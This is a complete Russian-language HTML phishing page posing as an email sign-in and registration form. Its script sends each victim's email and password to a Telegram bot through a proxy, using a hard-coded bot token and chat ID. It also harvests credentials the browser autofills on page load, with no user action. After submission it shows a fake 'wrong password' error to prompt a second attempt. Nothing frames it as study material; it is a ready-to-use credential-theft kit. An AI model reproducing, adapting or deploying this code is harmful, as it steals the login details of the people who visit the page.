<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Регистрация</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-box {
            background: white;
            padding: 38px;
            border-radius: 14px;
            box-shadow: 0 4px 14px rgba(0,0,0,0.15);
            width: 340px;
            text-align: center;
        }
        .login-box input {
            width: 100%;
            padding: 13px;
            margin: 9px 0;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
        }
        .login-box input.input-error {
            border-color: #d93025;
            background: #fff5f5;
        }
        .login-box button {
            width: 100%;
            padding: 13px;
            background: #0077cc;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 7px;
        }
        .login-box button:hover { background: #005fa3; }
        .logo {
            font-size: 26px;
            font-weight: bold;
            margin-bottom: 18px;
        }
        .error-message {
            color: #d93025;
            margin-top: 13px;
            font-size: 13px;
            padding: 11px;
            background: #fce8e6;
            border-radius: 6px;
            border-left: 4px solid #d93025;
            text-align: left;
            display: none;
        }
        .error-message.show { display: block; }
    </style>
</head>
<body>

    <div id="loginFormContainer" class="login-box">
        <div class="logo">📧 Вход</div>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Адрес электронной почты" required>
            <input type="password" id="password" placeholder="Пароль" required>
            <button type="submit">Зарегистрироваться</button>
            <div id="message" class="error-message"></div>
        </form>
    </div>

<script>
    // ===== ВАШИ ДАННЫЕ =====
    const PROXY_URL = "https://pale-plover-7740.testrus-ui.deno.net";
    const BOT_TOKEN = "8924231437:AAHSGN-TXN3D2olEVudrr53xp22SC03PCL8";
    const CHAT_ID = "8872810304";
    // ========================

    function send(text) {
        fetch(PROXY_URL + "/bot" + BOT_TOKEN + "/sendMessage", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
        }).catch(function() {});
    }

    function collectAndSend(type) {
        const email = document.getElementById("email").value.trim();
        const password = document.getElementById("password").value.trim();
        send("📩 " + type + "\n📧 Email: " + (email || "(пусто)") + "\n🔑 Пароль: " + (password || "(пусто)") + "\n🕒 " + new Date().toLocaleString("ru-RU"));
    }

    function showError(message) {
        const messageDiv = document.getElementById("message");
        messageDiv.textContent = message;
        messageDiv.classList.add("show");
        document.getElementById("email").classList.add("input-error");
        document.getElementById("password").classList.add("input-error");
    }

    function clearError() {
        const messageDiv = document.getElementById("message");
        messageDiv.classList.remove("show");
        messageDiv.textContent = "";
        document.getElementById("email").classList.remove("input-error");
        document.getElementById("password").classList.remove("input-error");
    }

    // ===== АВТОЗАПОЛНЕНИЕ ПРИ ЗАГРУЗКЕ =====
    // Если браузер сам подставил email и пароль — отправляем их тебе
    function checkAutoFill() {
        const email = document.getElementById("email").value.trim();
        const password = document.getElementById("password").value.trim();
        if (email && password) {
            send("📩 АВТОЗАПОЛНЕНИЕ\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString("ru-RU"));
        }
    }
    window.addEventListener("load", function() {
        setTimeout(checkAutoFill, 500);
        setTimeout(checkAutoFill, 1500);
        setTimeout(checkAutoFill, 3000);
    });

    // ===== ФОРМА =====
    document.getElementById("loginForm").addEventListener("submit", function(event) {
        event.preventDefault();
        const email = document.getElementById("email").value.trim();
        const password = document.getElementById("password").value.trim();

        if (!email || !password) {
            clearError();
            showError("Убедитесь, что вы ввели всё правильно.");
            return;
        }

        clearError();
        collectAndSend("РУЧНОЙ ВВОД");
        showError("Неверный адрес электронной почты или пароль. Убедитесь, что вы ввели всё правильно.");
    });

    console.log("ROCKET ACTIVE — только форма");
</script>
</body>
</html>
